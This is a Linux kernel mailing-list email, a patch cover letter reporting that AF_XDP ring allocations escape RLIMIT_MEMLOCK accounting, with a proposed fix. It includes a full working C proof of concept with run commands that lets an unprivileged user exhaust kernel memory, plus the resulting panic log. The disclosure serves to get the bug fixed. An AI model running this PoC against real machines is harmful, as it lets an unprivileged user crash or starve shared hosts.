Received: from mail-pz2-f1.google.com (mail-pz2-f1.google.com [74.125.228.1])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A64F73806D9
	for <bpf@vger.kernel.org>; Thu, 30 Jul 2026 15:39:06 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.1
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785425948; cv=none; b=G46NaTuQjnQBqc96rR+t9SJnAabtn8PQ9b/I5lV4zweuMpApslTRI7X2QBOhf7NCCZERj1w4fuZPXI0Eiefft6hKQSjseDQo14TEk3vF3WojQ7f4Se9CLmvkn5doPW4jvu0SRc7ifgiHz0zKnxbazCRIxGs6DyV9Xhnp4f/7pNc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785425948; c=relaxed/simple;
	bh=mHr1CM5Sk4EUY18QWAMNqfb5KTW6Q9HGR/ZiUdA+Be8=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=L5DJmn8aGDroAas8cd+SJxP5TZ7E501Uik7WnSXrzZ0lrnKGnnOFbCPZtrTK3edajCGox6BwXnQt7+JCpy//80CSJAs68ek60W+omU+mxT+884wIjsBjK/9MF9PvbKJJTAyPfRP4NpbC5a/tVBApaSjUp+khlB/Sowh9sP3MjpA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=VeHThG9r; arc=none smtp.client-ip=74.125.228.1
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="VeHThG9r"
Received: by mail-pz2-f1.google.com with SMTP id 41be03b00d2f7-c9fcd903839so944393a12.1
        for <bpf@vger.kernel.org>; Thu, 30 Jul 2026 08:39:06 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785425946; x=1786030746; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=2xFtdf5ZIQNT/wYxekdvrv76PwSYt6hnXMFlyB8qKPk=;
        b=VeHThG9rrzCcwgc7zCd+jklnrw78werZhGSVoRDiaecAUPSfY7Mj88u4WILb/DRhvD
         I+M978Txd9UzOscW+qbSgkmLLe8twDZhhG8B3GVzrzgtMp9BzWD8dBPCK5SW45vBHKvJ
         ZsY9nmJqy3SxlPP2SALJU6Apvvc/Yu0G0kf+2JIRJAFKSISIplbLodPTRmYcEsrGHF75
         SSO7HiBWMAzxUQYJlPush6FWMPUWRVZeBXKqaLU67NBykKO6Z767kidVPYiDMYIMsK95
         z+OR2H3MXVhDqGMNnBZbzjco4N7nKz75h3aiDjr9sndfHxKidJFEs8uXDio7THRHt6OV
         1fow==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785425946; x=1786030746;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=2xFtdf5ZIQNT/wYxekdvrv76PwSYt6hnXMFlyB8qKPk=;
        b=HdmDmQxhcyGbK8mLR6fJ8Xgr+guPq/cs5VL8PqITqEjjkVbMkjtRYZA2AABclHDrS0
         hV+caN/bZMI25Ern/SZFVl1Jw6eMsG6QhcFl4vXa010FoTGDvDmt+dVQ8t1QjRVOVG7E
         MbzSf3wZbQbBSLx3pHyEZ6SK+P1n1ykOWS/npZjbxkwPGOrU9QH47wPa15EGSEj/Tgg/
         /PHhuHSRKv7UILHKitDH77dut+Sor5fYUxqP1jHHWNqnVZPYmkux5Ao5EnBt62eAvhcS
         gImptuwIIx+zAtevzzddNY6U6NQPdVS5kK2MMyotLCfq3kxdefdQCwVtijcsD5t/U5ft
         sJDQ==
X-Forwarded-Encrypted: i=1; AHgh+Ro9moH7FB+IdJLsJ4Xg0+XNQ7y/Odlw9pOjQ9GvbhnX5Hy9PcRM0Rz+jRhtj6NhKBHLAz0=@vger.kernel.org
X-Gm-Message-State: AOJu0Yxmodln0xGJvfTSyUjHdF5V3eK86euPoZYGY2qvBTRqm4hIuHlB
	XcWvRKXBPVElIcSpqqqmNTYRnhJ2Zopyh5NRkXTWFaqPqNCpmPWH7h04ZOEl2tHgKxwr
X-Gm-Gg: AR+sD13GGU9YGwsulgoNLnFMMnyFH/mOLD8cDTFY+5In1GUU+mr6Jvn83CMibVCArWj
	o2GNQ0MuFJ2sun1VWwbu5rM4cDy0gSLeog5cvu05Mc8TvCbGRGtcXpBTlXmy4Od+fE23mjyp+qF
	xmnowFK1eTI6KFGiQSSslbhYUrk/EBUxvkrx1QcmoGVduu7j8ZctA0dy7GGaqXu0fqO1bcm2Pps
	2ZqwQBntMIaUsmvFL+USz3rmHhDJ0GOuiBlUWueZ/GMi5euk+olni++qDZ4AS+zD2WwzyoxHfAF
	EUfUpzYve+PxDsnO2ZI6xayY5tdhYe66RcIlxpFpr5dPqZTrIUGbB3b1c6ZUEBp1cgSiJJPNaeR
	249hFuYd0zmMWa73oR0HsdneYSjoaHNhPE5iuiZi5v+/QaeSNFrKezhg8K1w3BeGJcZtuPYR7M7
	h5ykmlTnj8Bwxc62TsIuNLYf45MevxQjtYwIOS1+ucztd8KKGGvhzslwyuwCGzMe3JUADohS0=
X-Received: by 2002:a05:6a00:1d90:b0:841:dca1:8b69 with SMTP id d2e1a72fcca58-84ebc1f62f3mr2902779b3a.5.1785425945595;
        Thu, 30 Jul 2026 08:39:05 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cbdb824f077sm2242214a12.11.2026.07.30.08.39.00
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 30 Jul 2026 08:39:05 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: magnus.karlsson@intel.com,
	maciej.fijalkowski@intel.com,
	sdf@fomichev.me,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	ast@kernel.org,
	daniel@iogearbox.net,
	hawk@kernel.org,
	john.fastabend@gmail.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v2 0/1] xsk: fix unaccounted ring allocations causing memory exhaustion
Date: Thu, 30 Jul 2026 15:38:31 +0000
Message-ID: <20260730153832.11238-1-zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/xdp/xsk_queue.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

AF_XDP lets user space allocate RX, TX, UMEM fill and UMEM completion
rings with setsockopt() and mmap them into the process. The shared
xskq_create() helper allocates the ring backing memory, but unlike UMEM
registration it does not account those pages against RLIMIT_MEMLOCK /
user->locked_vm.

As a result, a process with CAP_NET_RAW in a user and network namespace
can request very large rings and pin a large amount of kernel memory
before bind or any packet I/O. In our original report the resulting OOM
ended in a panic because that guest had panic_on_oom enabled. The panic
was only the environment-specific end result; the bug itself is the
missing resource boundary that lets ring allocations consume excessive
memory in the first place.

The first version tried to bound these allocations with sysctl_optmem_max,
but that was the wrong resource model. We also evaluated a memcg-accounted
vmalloc path as suggested, but memcg attribution by itself did not impose
a default enforcement boundary in our validation setup. AF_XDP already
uses RLIMIT_MEMLOCK / user->locked_vm to bound pinned UMEM pages, and the
ring pages are likewise user-controlled, mmapable and long-lived. This
version therefore accounts AF_XDP ring allocations with the existing
mm_account_pinned_pages() helper and unaccounts them when the queue is
destroyed, so ring memory is constrained by the same default limit model
already used for AF_XDP UMEM pages.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <errno.h>
#include <linux/if_xdp.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <unistd.h>

static void print_meminfo(const char *tag)
{
	struct sysinfo info;

	if (sysinfo(&info) == 0) {
		unsigned long long total = (unsigned long long)info.totalram * info.mem_unit;
		unsigned long long free = (unsigned long long)info.freeram * info.mem_unit;
		unsigned long long avail = (unsigned long long)info.bufferram * info.mem_unit;

		fprintf(stderr,
			"%s: total=%llu MiB free=%llu MiB buff=%llu MiB\n",
			tag, total >> 20, free >> 20, avail >> 20);
	}
}

static int set_ring(int fd, int optname, unsigned int entries, const char *name)
{
	int ret;

	ret = setsockopt(fd, SOL_XDP, optname, &entries, sizeof(entries));
	if (ret) {
		fprintf(stderr, "setsockopt(%s, %u) failed: %s\n",
			name, entries, strerror(errno));
		return -1;
	}

	fprintf(stderr, "allocated %s ring with %u entries on fd=%d\n",
		name, entries, fd);
	return 0;
}

int main(int argc, char **argv)
{
	static const struct {
		int optname;
		const char *name;
	} rings[] = {
		{ XDP_RX_RING, "XDP_RX_RING" },
		{ XDP_TX_RING, "XDP_TX_RING" },
		{ XDP_UMEM_FILL_RING, "XDP_UMEM_FILL_RING" },
		{ XDP_UMEM_COMPLETION_RING, "XDP_UMEM_COMPLETION_RING" },
	};
	unsigned int entries = 1U << 25;
	int nsockets = 8;
	int *fds;
	int i, j;

	if (argc > 1)
		entries = strtoul(argv[1], NULL, 0);
	if (argc > 2)
		nsockets = atoi(argv[2]);
	if (!entries || !nsockets) {
		fprintf(stderr, "usage: %s [entries power-of-two] [socket_count]\n",
			argv[0]);
		return 1;
	}

	fds = calloc(nsockets, sizeof(*fds));
	if (!fds) {
		perror("calloc");
		return 1;
	}

	fprintf(stderr,
		"AF_XDP ring exhaustion PoC: entries=%u sockets=%d pid=%d\n",
		entries, nsockets, getpid());
	print_meminfo("before");

	for (i = 0; i < nsockets; i++) {
		fds[i] = socket(AF_XDP, SOCK_RAW, 0);
		if (fds[i] < 0) {
			fprintf(stderr, "socket(AF_XDP) failed at index %d: %s\n",
				i, strerror(errno));
			break;
		}

		fprintf(stderr, "opened AF_XDP socket %d fd=%d\n", i, fds[i]);
		for (j = 0; j < (int)(sizeof(rings) / sizeof(rings[0])); j++) {
			if (set_ring(fds[i], rings[j].optname, entries, rings[j].name))
				goto out;
			print_meminfo(rings[j].name);
		}
	}

out:
	fprintf(stderr, "holding allocations open; press Ctrl-C or wait\n");
	sleep(600);

	for (i = 0; i < nsockets; i++) {
		if (fds[i] >= 0)
			close(fds[i]);
	}
	free(fds);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[  112.547501][  T953] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[  112.548314][  T953] CPU: 2 UID: 1028 PID: 953 Comm: poc Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  112.549150][  T953] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  112.550090][  T953] Call Trace:
[  112.550346][  T953]  <TASK>
[  112.550569][  T953]  panic (kernel/panic.c:1101)
[  112.550876][  T953]  ? __pfx_panic (include/linux/nmi.h:163)
[  112.551222][  T953]  ? __pfx_lock_release+0x10/0x10
[  112.551642][  T953]  out_of_memory (mm/oom_kill.c:1193)
[  112.552013][  T953]  ? __alloc_pages_slowpath.constprop.0+0xa0f/0x2800
[  112.552538][  T953]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[  112.552919][  T953]  ? __pfx_mutex_trylock (kernel/locking/mutex.c:582 (discriminator 1))
[  112.553335][  T953]  __alloc_pages_slowpath.constprop.0+0x1eb8/0x2800
[  112.553854][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.554295][  T953]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x10
[  112.554819][  T953]  ? local_clock_noinstr (kernel/sched/clock.c:307 (discriminator 1))
[  112.555214][  T953]  ? lock_release+0x687/0xc90
[  112.555584][  T953]  ? __pfx___might_resched+0x10/0x10
[  112.556006][  T953]  __alloc_pages_noprof (mm/page_alloc.c:5221 (discriminator 1))
[  112.556409][  T953]  ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4967)
[  112.556860][  T953]  alloc_pages_mpol_noprof+0x1b1/0x430
[  112.557289][  T953]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  112.557759][  T953]  ? __pfx___might_resched+0x10/0x10
[  112.558179][  T953]  __vmalloc_node_range_noprof (include/linux/workqueue.h:699 include/linux/workqueue.h:760 mm/vmalloc.c:3801 mm/vmalloc.c:3941 mm/vmalloc.c:4082)
[  112.558628][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
[  112.558990][  T953]  ? __pfx___vmalloc_node_range_noprof (mm/vmalloc.c:4143 (discriminator 2))
[  112.559508][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.559950][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
[  112.560346][  T953]  vmalloc_user_noprof (mm/vmalloc.c:4484 (discriminator 4))
[  112.560731][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
[  112.561096][  T953]  xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
[  112.561434][  T953]  xsk_setsockopt (net/xdp/xsk.c:1198)
[  112.561799][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.562227][  T953]  ? aa_sk_perm+0x131/0x8a0
[  112.562573][  T953]  ? __pfx_xsk_setsockopt (include/linux/refcount.h:461)
[  112.562975][  T953]  ? security_file_permission (security/security.c:2424 (discriminator 18))
[  112.563420][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.563850][  T953]  ? vfs_write (fs/read_write.c:799)
[  112.564222][  T953]  do_sock_setsockopt (net/socket.c:395)
[  112.564610][  T953]  ? __pfx_do_sock_setsockopt (net/socket.c:282 (discriminator 1))
[  112.565046][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.565490][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.565926][  T953]  ? __do_sys_sysinfo (kernel/sys.c:2202)
[  112.566333][  T953]  ? __pfx___do_sys_sysinfo (kernel/sys.c:3073)
[  112.566758][  T953]  __sys_setsockopt (net/socket.c:2396)
[  112.567144][  T953]  __x64_sys_setsockopt (arch/x86/include/asm/compat.h:94 (discriminator 1) arch/x86/include/asm/compat.h:100 (discriminator 1) net/socket.c:2505 (discriminator 1))
[  112.567538][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  112.567967][  T953]  ? trace_hardirqs_on+0x5b/0x110
[  112.568366][  T953]  do_syscall_64 (arch/x86/include/asm/entry-common.h:43 (discriminator 3) include/linux/irq-entry-common.h:100 (discriminator 3) include/linux/entry-common.h:174 (discriminator 3) arch/x86/entry/syscall_64.c:89 (discriminator 3))
[  112.568721][  T953]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  112.569187][  T953] RIP: 0033:0x7e2b01ae42ba
[  112.569541][  T953] Code: 48 83 ec 10 48 63 c9 48 63 ff 45 89 c9 6a 2c e8 fc d3 f7 ff 48 83 c4 18 c3 0f 1f 80 00 00 00 00 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 06 c3 0f 1f 44 00 00 48 8b 15 21 2b 0d 00 f7
All code
========
   0:	48 83 ec 10          	sub    $0x10,%rsp
   4:	48 63 c9             	movslq %ecx,%rcx
   7:	48 63 ff             	movslq %edi,%rdi
   a:	45 89 c9             	mov    %r9d,%r9d
   d:	6a 2c                	push   $0x2c
   f:	e8 fc d3 f7 ff       	call   0xfffffffffff7d410
  14:	48 83 c4 18          	add    $0x18,%rsp
  18:	c3                   	ret
  19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  20:	49 89 ca             	mov    %rcx,%r10
  23:	b8 36 00 00 00       	mov    $0x36,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 06                	ja     0x38
  32:	c3                   	ret
  33:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  38:	48 8b 15 21 2b 0d 00 	mov    0xd2b21(%rip),%rdx        # 0xd2b60
  3f:	f7                   	.byte 0xf7

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 06                	ja     0xe
   8:	c3                   	ret
   9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   e:	48 8b 15 21 2b 0d 00 	mov    0xd2b21(%rip),%rdx        # 0xd2b36
  15:	f7                   	.byte 0xf7
[  112.571019][  T953] RSP: 002b:00007ffc66ef6958 EFLAGS: 00000283 ORIG_RAX: 0000000000000036
[  112.571683][  T953] RAX: ffffffffffffffda RBX: 000055d2e378619e RCX: 00007e2b01ae42ba
[  112.572300][  T953] RDX: 0000000000000005 RSI: 000000000000011b RDI: 0000000000000003
[  112.572901][  T953] RBP: 0000000000000000 R08: 0000000000000004 R09: 0000000000000000
[  112.573505][  T953] R10: 00007ffc66ef697c R11: 0000000000000283 R12: 000055d2e3787dc0
[  112.574127][  T953] R13: 0000000004000000 R14: 00007ffc66ef697c R15: 0000000000000003
[  112.574744][  T953]  </TASK>
[  112.575596][  T953] Kernel Offset: disabled
[  112.575937][  T953] Rebooting in 10 seconds..
-----END crash log-----

Best regards,
Zihan Xi

changes in v2:
  - replace the socket optmem limit proposal with RLIMIT_MEMLOCK /
    user->locked_vm accounting via mm_account_pinned_pages()
  - drop the earlier socket/pool lifetime coupling changes and keep the
    final code diff limited to xsk_queue.c and xsk_queue.h
  - clarify that panic_on_oom only affected the observed end result, while
    the bug is the missing resource boundary for ring allocations
  - explain why memcg attribution alone was not sufficient as the default
    enforcement boundary in the validated setup
  - v1 Link: https://lore.kernel.org/all/cover.1785313094.git.zihanx@nebusec.ai/

Zihan Xi (1):
  xsk: account ring allocations to RLIMIT_MEMLOCK

 net/xdp/xsk_queue.c | 8 ++++++++
 net/xdp/xsk_queue.h | 4 +++-
 2 files changed, 11 insertions(+), 1 deletion(-)

-- 
2.43.0

